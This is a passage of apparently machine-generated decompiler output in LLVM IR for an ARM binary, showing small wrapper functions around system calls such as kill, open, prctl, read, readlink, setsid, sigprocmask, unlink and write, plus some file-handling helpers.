  %v0_12f88 = phi i32 [ %v2_12f68, %dec_label_pc_12f4c ], [ -1, %dec_label_pc_12f78 ]
  ret i32 %v0_12f88

; uselistorder directives
  uselistorder i32 %v2_12f68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f88, { 1, 0 }
}

define i32 @function_12f9c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12f9c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f9c = load i32, i32* @r4, align 4
  store i32 %v3_12f9c, i32* %stack_var_-8, align 4
  %v2_12fa0 = call i32 @kill(i32 %arg1, i32 %arg2)
  %v7_12fa4 = icmp eq i32 %v2_12fa0, -4096
  store i1 %v7_12fa4, i1* @cpsr_z, align 1
  store i32 %v2_12fa0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_12fa0, -4095
  br i1 %tmp, label %dec_label_pc_12fc0, label %dec_label_pc_12fb0

dec_label_pc_12fb0:                               ; preds = %dec_label_pc_12f9c
  %v0_12fb0 = call i32 @function_13470()
  %v0_12fb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_12fb4 = sub i32 0, %v0_12fb4
  %v2_12fb8 = inttoptr i32 %v0_12fb0 to i32*
  store i32 %v1_12fb4, i32* %v2_12fb8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12fc0

dec_label_pc_12fc0:                               ; preds = %dec_label_pc_12f9c, %dec_label_pc_12fb0
  %v0_12fc0 = phi i32 [ %v2_12fa0, %dec_label_pc_12f9c ], [ -1, %dec_label_pc_12fb0 ]
  %v2_12fc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12fc4, i32* @r4, align 4
  ret i32 %v0_12fc0

; uselistorder directives
  uselistorder i32 %v2_12fa0, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_12fc0, { 1, 0 }
}

define i32 @function_12fc8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12fc8:
  %r4.global-to-local = alloca i32, align 4
  %v1_12fd8 = and i32 %arg2, 64
  %v2_12fd8 = icmp eq i32 %v1_12fd8, 0
  br i1 %v2_12fd8, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_12fc8
  %v6_12fc8 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_12fc8, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12fc8, %bb
  %v0_12fe8 = phi i32 [ 0, %dec_label_pc_12fc8 ], [ %phitmp, %bb ]
  store i32 %v0_12fe8, i32* @r2, align 4
  %v4_12ff0 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_12ff4 = icmp eq i32 %v4_12ff0, -4096
  store i1 %v7_12ff4, i1* @cpsr_z, align 1
  store i32 %v4_12ff0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12ff0, -4095
  br i1 %tmp, label %dec_label_pc_13010, label %dec_label_pc_13000

dec_label_pc_13000:                               ; preds = %.thread1
  %v0_13000 = call i32 @function_13470()
  %v0_13004 = load i32, i32* %r4.global-to-local, align 4
  %v1_13004 = sub i32 0, %v0_13004
  %v2_13008 = inttoptr i32 %v0_13000 to i32*
  store i32 %v1_13004, i32* %v2_13008, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13010

dec_label_pc_13010:                               ; preds = %.thread1, %dec_label_pc_13000
  %v0_13010 = phi i32 [ %v4_12ff0, %.thread1 ], [ -1, %dec_label_pc_13000 ]
  ret i32 %v0_13010

; uselistorder directives
  uselistorder i32 %v4_12ff0, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_13010, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_13024(i32 %arg1) local_unnamed_addr {
dec_label_pc_13024:
  store i32 %arg1, i32* @r2, align 4
  %v0_1302c = load i32, i32* @r0, align 4
  %v2_1302c = inttoptr i32 %v0_1302c to i8*
  %v3_1302c = call i32 @function_12fc8(i8* %v2_1302c, i32 577)
  %v0_13030 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13030, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13024
  %v6_13030 = and i32 %v3_1302c, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13024, %bb
  %v7_13030 = phi i32 [ %v3_1302c, %dec_label_pc_13024 ], [ %v6_13030, %bb ]
  ret i32 %v7_13030

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_13034(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13034:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13034 = load i32, i32* @r4, align 4
  store i32 %v3_13034, i32* %stack_var_-8, align 4
  %v4_1303c = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 0)
  store i32 %v4_1303c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_1303c, -4095
  br i1 %tmp, label %dec_label_pc_1305c, label %dec_label_pc_1304c

dec_label_pc_1304c:                               ; preds = %dec_label_pc_13034
  %v0_1304c = call i32 @function_13470()
  %v0_13050 = load i32, i32* %r4.global-to-local, align 4
  %v1_13050 = sub i32 0, %v0_13050
  %v2_13054 = inttoptr i32 %v0_1304c to i32*
  store i32 %v1_13050, i32* %v2_13054, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1305c

dec_label_pc_1305c:                               ; preds = %dec_label_pc_13034, %dec_label_pc_1304c
  %v0_1305c = phi i32 [ %v4_1303c, %dec_label_pc_13034 ], [ -1, %dec_label_pc_1304c ]
  %v2_13060 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13060, i32* @r4, align 4
  ret i32 %v0_1305c

; uselistorder directives
  uselistorder i32 %v4_1303c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1305c, { 1, 0 }
}

define i32 @function_13064(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13064:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13064 = load i32, i32* @r4, align 4
  store i32 %v3_13064, i32* %stack_var_-8, align 4
  %v4_13068 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_13068, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_13068, -4095
  br i1 %tmp, label %dec_label_pc_13088, label %dec_label_pc_13078

dec_label_pc_13078:                               ; preds = %dec_label_pc_13064
  %v0_13078 = call i32 @function_13470()
  %v0_1307c = load i32, i32* %r4.global-to-local, align 4
  %v1_1307c = sub i32 0, %v0_1307c
  %v2_13080 = inttoptr i32 %v0_13078 to i32*
  store i32 %v1_1307c, i32* %v2_13080, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13088

dec_label_pc_13088:                               ; preds = %dec_label_pc_13064, %dec_label_pc_13078
  %v0_13088 = phi i32 [ %v4_13068, %dec_label_pc_13064 ], [ -1, %dec_label_pc_13078 ]
  %v2_1308c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1308c, i32* @r4, align 4
  ret i32 %v0_13088

; uselistorder directives
  uselistorder i32 %v4_13068, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13088, { 1, 0 }
}

define i32 @function_13090(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13090:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v3_13090 = load i32, i32* @r4, align 4
  store i32 %v3_13090, i32* %stack_var_-8, align 4
  %v7_13094 = call i32 @readlink(i8* %arg1, i8* %tmp, i32 %arg3)
  store i32 %v7_13094, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v7_13094, -4095
  br i1 %tmp6, label %dec_label_pc_130b4, label %dec_label_pc_130a4

dec_label_pc_130a4:                               ; preds = %dec_label_pc_13090
  %v0_130a4 = call i32 @function_13470()
  %v0_130a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_130a8 = sub i32 0, %v0_130a8
  %v2_130ac = inttoptr i32 %v0_130a4 to i32*
  store i32 %v1_130a8, i32* %v2_130ac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130b4

dec_label_pc_130b4:                               ; preds = %dec_label_pc_13090, %dec_label_pc_130a4
  %v0_130b4 = phi i32 [ %v7_13094, %dec_label_pc_13090 ], [ -1, %dec_label_pc_130a4 ]
  %v2_130b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_130b8, i32* @r4, align 4
  ret i32 %v0_130b4

; uselistorder directives
  uselistorder i32 %v7_13094, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130b4, { 1, 0 }
}

define i32 @function_130bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_130bc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_130bc = load i32, i32* @r4, align 4
  store i32 %v3_130bc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_130e4, label %dec_label_pc_130d4

dec_label_pc_130d4:                               ; preds = %dec_label_pc_130bc
  %v0_130d4 = call i32 @function_13470()
  %v0_130d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_130d8 = sub i32 0, %v0_130d8
  %v2_130dc = inttoptr i32 %v0_130d4 to i32*
  store i32 %v1_130d8, i32* %v2_130dc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_130e8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_130e4

dec_label_pc_130e4:                               ; preds = %dec_label_pc_130bc, %dec_label_pc_130d4
  %v2_130e8 = phi i32 [ %v3_130bc, %dec_label_pc_130bc ], [ %v2_130e8.pre, %dec_label_pc_130d4 ]
  %v0_130e4 = phi i32 [ %arg1, %dec_label_pc_130bc ], [ -1, %dec_label_pc_130d4 ]
  store i32 %v2_130e8, i32* @r4, align 4
  ret i32 %v0_130e4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130e4, { 1, 0 }
}

define i32 @function_130ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_130ec:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_130ec = load i32, i32* @r4, align 4
  store i32 %v3_130ec, i32* %stack_var_-8, align 4
  %v0_130f0 = call i32 @setsid()
  store i32 %v0_130f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_130f0, -4095
  br i1 %tmp, label %dec_label_pc_13110, label %dec_label_pc_13100

dec_label_pc_13100:                               ; preds = %dec_label_pc_130ec
  %v0_13100 = call i32 @function_13470()
  %v0_13104 = load i32, i32* %r4.global-to-local, align 4
  %v1_13104 = sub i32 0, %v0_13104
  %v2_13108 = inttoptr i32 %v0_13100 to i32*
  store i32 %v1_13104, i32* %v2_13108, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13110

dec_label_pc_13110:                               ; preds = %dec_label_pc_130ec, %dec_label_pc_13100
  %v0_13110 = phi i32 [ %v0_130f0, %dec_label_pc_130ec ], [ -1, %dec_label_pc_13100 ]
  %v2_13114 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13114, i32* @r4, align 4
  ret i32 %v0_13110

; uselistorder directives
  uselistorder i32 %v0_130f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13110, { 1, 0 }
}

define i32 @function_13118(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13118:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13118 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_13118, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13118
  %v3_131205 = load i32, i32* @r4, align 4
  store i32 %v3_131205, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13140

bb:                                               ; preds = %dec_label_pc_13118
  %v3_13120 = load i32, i32* @r4, align 4
  store i32 %v3_13120, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_13140, label %dec_label_pc_1312c

dec_label_pc_1312c:                               ; preds = %bb
  %v0_1312c = call i32 @function_13470()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13138 = inttoptr i32 %v0_1312c to i32*
  store i32 22, i32* %v2_13138, align 4
  %v0_13164.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13164

dec_label_pc_13140:                               ; preds = %.thread, %bb
  %v7_13140 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_13140, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_13140, -4095
  br i1 %tmp13, label %dec_label_pc_13160, label %dec_label_pc_13150

dec_label_pc_13150:                               ; preds = %dec_label_pc_13140
  %v0_13150 = call i32 @function_13470()
  %v0_13154 = load i32, i32* %r4.global-to-local, align 4
  %v1_13154 = sub i32 0, %v0_13154
  %v2_13158 = inttoptr i32 %v0_13150 to i32*
  store i32 %v1_13154, i32* %v2_13158, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13160

dec_label_pc_13160:                               ; preds = %dec_label_pc_13140, %dec_label_pc_13150
  %v0_13160 = phi i32 [ %v7_13140, %dec_label_pc_13140 ], [ -1, %dec_label_pc_13150 ]
  store i32 %v0_13160, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13164

dec_label_pc_13164:                               ; preds = %dec_label_pc_1312c, %dec_label_pc_13160
  %v0_13164 = phi i32 [ %v0_13164.pre, %dec_label_pc_1312c ], [ %v0_13160, %dec_label_pc_13160 ]
  %v2_13168 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13168, i32* @r4, align 4
  ret i32 %v0_13164

; uselistorder directives
  uselistorder i32 %v7_13140, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13164, { 1, 0 }
  uselistorder label %dec_label_pc_13160, { 1, 0 }
  uselistorder label %dec_label_pc_13140, { 1, 0 }
}

define i32 @function_1316c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1316c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1316c = load i32, i32* @r4, align 4
  store i32 %v3_1316c, i32* %stack_var_-8, align 4
  %v2_13170 = call i32 @time(i32* %arg1)
  store i32 %v2_13170, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13170, -4095
  br i1 %tmp, label %dec_label_pc_13190, label %dec_label_pc_13180

dec_label_pc_13180:                               ; preds = %dec_label_pc_1316c
  %v0_13180 = call i32 @function_13470()
  %v0_13184 = load i32, i32* %r4.global-to-local, align 4
  %v1_13184 = sub i32 0, %v0_13184
  %v2_13188 = inttoptr i32 %v0_13180 to i32*
  store i32 %v1_13184, i32* %v2_13188, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13190

dec_label_pc_13190:                               ; preds = %dec_label_pc_1316c, %dec_label_pc_13180
  %v0_13190 = phi i32 [ %v2_13170, %dec_label_pc_1316c ], [ -1, %dec_label_pc_13180 ]
  %v2_13194 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13194, i32* @r4, align 4
  ret i32 %v0_13190

; uselistorder directives
  uselistorder i32 %v2_13170, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13190, { 1, 0 }
}

define i32 @function_13198(i8* %arg1) local_unnamed_addr {
dec_label_pc_13198:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13198 = load i32, i32* @r4, align 4
  store i32 %v3_13198, i32* %stack_var_-8, align 4
  %v3_1319c = call i32 @unlink(i8* %arg1)
  store i32 %v3_1319c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_1319c, -4095
  br i1 %tmp, label %dec_label_pc_131bc, label %dec_label_pc_131ac

dec_label_pc_131ac:                               ; preds = %dec_label_pc_13198
  %v0_131ac = call i32 @function_13470()
  %v0_131b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_131b0 = sub i32 0, %v0_131b0
  %v2_131b4 = inttoptr i32 %v0_131ac to i32*
  store i32 %v1_131b0, i32* %v2_131b4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_131bc

dec_label_pc_131bc:                               ; preds = %dec_label_pc_13198, %dec_label_pc_131ac
  %v0_131bc = phi i32 [ %v3_1319c, %dec_label_pc_13198 ], [ -1, %dec_label_pc_131ac ]
  %v2_131c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_131c0, i32* @r4, align 4
  ret i32 %v0_131bc

; uselistorder directives
  uselistorder i32 %v3_1319c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131bc, { 1, 0 }
}

define i32 @function_131c4(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_131c4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_131c4 = load i32, i32* @r4, align 4
  store i32 %v3_131c4, i32* %stack_var_-8, align 4
  %v4_131c8 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_131c8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_131c8, -4095
  br i1 %tmp, label %dec_label_pc_131e8, label %dec_label_pc_131d8

dec_label_pc_131d8:                               ; preds = %dec_label_pc_131c4
  %v0_131d8 = call i32 @function_13470()
  %v0_131dc = load i32, i32* %r4.global-to-local, align 4
  %v1_131dc = sub i32 0, %v0_131dc
  %v2_131e0 = inttoptr i32 %v0_131d8 to i32*
  store i32 %v1_131dc, i32* %v2_131e0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_131e8

dec_label_pc_131e8:                               ; preds = %dec_label_pc_131c4, %dec_label_pc_131d8
  %v0_131e8 = phi i32 [ %v4_131c8, %dec_label_pc_131c4 ], [ -1, %dec_label_pc_131d8 ]
  %v2_131ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_131ec, i32* @r4, align 4
  ret i32 %v0_131e8

; uselistorder directives
  uselistorder i32 %v4_131c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131e8, { 1, 0 }
}

define i32 @function_131f0(i32* %arg1) local_unnamed_addr {
dec_label_pc_131f0:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_131f0 = load i32, i32* @r4, align 4
  store i32 %v3_131f0, i32* %stack_var_-20, align 4
  %v6_131f0 = load i32, i32* @r5, align 4
  %v9_131f0 = load i32, i32* @r6, align 4
  %v12_131f0 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_131f8 = load i32, i32* %arg1, align 4
  store i32 %v2_131f8, i32* %r4.global-to-local, align 4
  %v2_131fc = ptrtoint i32* %stack_var_-36 to i32
  %v1_13200 = add i32 %tmp, 24
  store i32 %v1_13200, i32* @r6, align 4
  %v3_13204 = icmp eq i32 %v2_131f8, -1
  store i32 %v2_131fc, i32* @r7, align 4
  store i32 %v1_13200, i32* %r2.global-to-local, align 4
  store i32 %v2_131fc, i32* @r0, align 4
  br i1 %v3_13204, label %dec_label_pc_1321c, label %dec_label_pc_13230

dec_label_pc_1321c:                               ; preds = %dec_label_pc_131f0
  %v0_1321c = call i32 @function_13470()
  %v0_13224 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13224, i32* %r2.global-to-local, align 4
  %v2_13228 = inttoptr i32 %v0_1321c to i32*
  store i32 9, i32* %v2_13228, align 4
  %v0_13288.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13288

dec_label_pc_13230:                               ; preds = %dec_label_pc_131f0
  %v8_13238 = call i32 @function_144dc(i32 %v2_131fc, i32 ptrtoint (i32* @global_var_144d4.572 to i32), i32 %v1_13200, i32 83164, i32 %v3_131f0, i32 %v6_131f0, i32 %v9_131f0)
  %v1_13248 = call i32 @function_144d4()
  %v0_13254 = load i32, i32* @r5, align 4
  %v1_13254 = inttoptr i32 %v0_13254 to i32*
  %v2_13254 = load i32, i32* %v1_13254, align 4
  store i32 %v2_13254, i32* @r4, align 4
  store i32 %v2_131fc, i32* @r0, align 4
  store i32 -1, i32* %v1_13254, align 4
  store i32 ptrtoint (i32* @global_var_1326c.576 to i32), i32* @lr, align 4
  %v8_13268 = call i32 @function_144dc(i32 %v2_131fc, i32 1, i32 %v1_13200, i32 83164, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_1326c = load i32, i32* @r5, align 4
  %v1_1326c = add i32 %v0_1326c, 12
  %v2_1326c = inttoptr i32 %v1_1326c to i32*
  %v3_1326c = load i32, i32* %v2_1326c, align 4
  store i32 %v3_1326c, i32* @r0, align 4
  %v0_13270 = call i32 @function_13aec()
  %v0_13274 = load i32, i32* @r5, align 4
  store i32 %v0_13274, i32* @r0, align 4
  %v0_13278 = call i32 @function_13aec()
  %v0_1327c = load i32, i32* @r4, align 4
  %v1_13280 = call i32 @function_12e9c(i32 %v0_1327c)
  store i32 %v1_13280, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13288

dec_label_pc_13288:                               ; preds = %dec_label_pc_1321c, %dec_label_pc_13230
  %v0_13288 = phi i32 [ %v0_13288.pre, %dec_label_pc_1321c ], [ %v1_13280, %dec_label_pc_13230 ]
  %v2_13290 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13290, i32* @r4, align 4
  store i32 %v6_131f0, i32* @r5, align 4
  store i32 %v9_131f0, i32* @r6, align 4
  store i32 %v12_131f0, i32* @r7, align 4
  ret i32 %v0_13288

; uselistorder directives
  uselistorder i32 %v1_13200, { 2, 1, 0, 3 }
  uselistorder i32 %v2_131fc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_131f0, { 1, 0 }
  uselistorder i32 %v6_131f0, { 1, 0 }
  uselistorder label %dec_label_pc_13288, { 1, 0 }
}

define i32 @function_132a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_132a4:
  %r5.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-108 = alloca i32, align 4
  %v3_132a4 = load i32, i32* @r4, align 4
  %v9_132a4 = load i32, i32* @r6, align 4
  %v12_132a4 = load i32, i32* @r7, align 4
  %v0_132b0 = load i32, i32* @r0, align 4
  %v2_132b0 = inttoptr i32 %v0_132b0 to i8*
  %v3_132b0 = call i32 @function_12fc8(i8* %v2_132b0, i32 18432)
  store i32 %v3_132b0, i32* @r0, align 4
  store i32 %v3_132b0, i32* @r7, align 4
  %v1_132b4 = icmp slt i32 %v3_132b0, 0
  br i1 %v1_132b4, label %.thread1, label %dec_label_pc_132c0

.thread1:                                         ; preds = %dec_label_pc_132a4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_13390

dec_label_pc_132c0:                               ; preds = %dec_label_pc_132a4
  %v2_132ac = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_132ac, i32* @r1, align 4
  %v0_132c4 = call i32 @function_14900()
  %v1_132c8 = icmp slt i32 %v0_132c4, 0
  br i1 %v1_132c8, label %dec_label_pc_132e8, label %dec_label_pc_132d0

dec_label_pc_132d0:                               ; preds = %dec_label_pc_132c0
  %v0_132d0 = load i32, i32* @r7, align 4
  store i32 1, i32* @r2, align 4
  %v2_132dc = call i32 @function_12dac(i32 %v0_132d0, i32 2)
  %v1_132e0 = icmp slt i32 %v2_132dc, 0
  br i1 %v1_132e0, label %dec_label_pc_132e8, label %dec_label_pc_13308

dec_label_pc_132e8:                               ; preds = %dec_label_pc_132d0, %dec_label_pc_132c0
  %v0_132e8 = call i32 @function_13470()
  store i32 %v0_132e8, i32* %r5.global-to-local, align 4
  %v0_132f0 = load i32, i32* @r7, align 4
  %v1_132f4 = inttoptr i32 %v0_132e8 to i32*
  %v2_132f4 = load i32, i32* %v1_132f4, align 4
  store i32 %v2_132f4, i32* @r4, align 4
  %v1_132f8 = call i32 @function_12e9c(i32 %v0_132f0)
  store i32 0, i32* @r6, align 4
  %v0_13300 = load i32, i32* @r4, align 4
  %v1_13300 = load i32, i32* %r5.global-to-local, align 4
  %v2_13300 = inttoptr i32 %v1_13300 to i32*
  store i32 %v0_13300, i32* %v2_13300, align 4
  br label %dec_label_pc_13390

dec_label_pc_13308:                               ; preds = %dec_label_pc_132d0
  %v1_1330c = call i32 @function_13940(i32 48)
  store i32 %v1_1330c, i32* @r6, align 4
  %v2_13310 = icmp eq i32 %v1_1330c, 0
  br i1 %v2_13310, label %dec_label_pc_13360, label %dec_label_pc_13318

dec_label_pc_13318:                               ; preds = %dec_label_pc_13308
  store i32 0, i32* @r4, align 4
  %v2_1331c = add i32 %v1_1330c, 16
  %v3_1331c = inttoptr i32 %v2_1331c to i32*
  store i32 0, i32* %v3_1331c, align 4
  %v2_13324 = icmp ugt i32 %tmp, 511
  %v1_13328 = load i32, i32* @r6, align 4
  %v2_13328 = add i32 %v1_13328, 20
  %v3_13328 = inttoptr i32 %v2_13328 to i32*
  store i32 %tmp, i32* %v3_13328, align 4
  br i1 %v2_13324, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13318
  %v2_13330 = load i32, i32* @r6, align 4
  %v3_13330 = add i32 %v2_13330, 20
  %v4_13330 = inttoptr i32 %v3_13330 to i32*
  store i32 512, i32* %v4_13330, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13318, %bb
  %v0_13334 = load i32, i32* @r7, align 4
  %v1_13334 = load i32, i32* @r6, align 4
  %v2_13334 = inttoptr i32 %v1_13334 to i32*
  store i32 %v0_13334, i32* %v2_13334, align 4
  %v0_13338 = load i32, i32* @r4, align 4
  %v1_13338 = load i32, i32* @r6, align 4
  %v2_13338 = add i32 %v1_13338, 8
  %v3_13338 = inttoptr i32 %v2_13338 to i32*
  store i32 %v0_13338, i32* %v3_13338, align 4
  %v0_1333c = load i32, i32* @r4, align 4
  %v1_1333c = load i32, i32* @r6, align 4
  %v2_1333c = add i32 %v1_1333c, 4
  %v3_1333c = inttoptr i32 %v2_1333c to i32*
  store i32 %v0_1333c, i32* %v3_1333c, align 4
  %v0_13344 = load i32, i32* @r6, align 4
  %v1_13344 = add i32 %v0_13344, 20
  %v2_13344 = inttoptr i32 %v1_13344 to i32*
  %v3_13344 = load i32, i32* %v2_13344, align 4
  %v2_13348 = call i32 @function_13a94(i32 1, i32 %v3_13344)
  %v2_1334c = icmp eq i32 %v2_13348, 0
  %v1_13350 = load i32, i32* @r6, align 4
  %v2_13350 = add i32 %v1_13350, 12
  %v3_13350 = inttoptr i32 %v2_13350 to i32*
  store i32 %v2_13348, i32* %v3_13350, align 4
  br i1 %v2_1334c, label %dec_label_pc_13358, label %dec_label_pc_1337c

dec_label_pc_13358:                               ; preds = %.thread
  %v0_13358 = load i32, i32* @r6, align 4
  store i32 %v0_13358, i32* @r0, align 4
  %v0_1335c = call i32 @function_13aec()
  br label %dec_label_pc_13360

dec_label_pc_13360:                               ; preds = %dec_label_pc_13308, %dec_label_pc_13358
  %v0_13360 = load i32, i32* @r7, align 4
  %v1_13364 = call i32 @function_12e9c(i32 %v0_13360)
  %v0_13368 = call i32 @function_13470()
  store i32 0, i32* @r6, align 4
  %v2_13374 = inttoptr i32 %v0_13368 to i32*
  store i32 12, i32* %v2_13374, align 4
  br label %dec_label_pc_13390

dec_label_pc_1337c:                               ; preds = %.thread
  store i32 78736, i32* @lr, align 4
  %v1_1338c = call i32 @function_144d4()
  br label %dec_label_pc_13390

dec_label_pc_13390:                               ; preds = %.thread1, %dec_label_pc_13360, %dec_label_pc_132e8, %dec_label_pc_1337c
  %v0_13390 = load i32, i32* @r6, align 4
  store i32 %v3_132a4, i32* @r4, align 4
  store i32 %v9_132a4, i32* @r6, align 4
  store i32 %v12_132a4, i32* @r7, align 4
  ret i32 %v0_13390

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_13a94, { 35, 5, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 1, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 4, 3, 2, 0 }
  uselistorder i32 512, { 0, 5, 1, 2, 8, 6, 7, 9, 3, 10, 4, 11 }
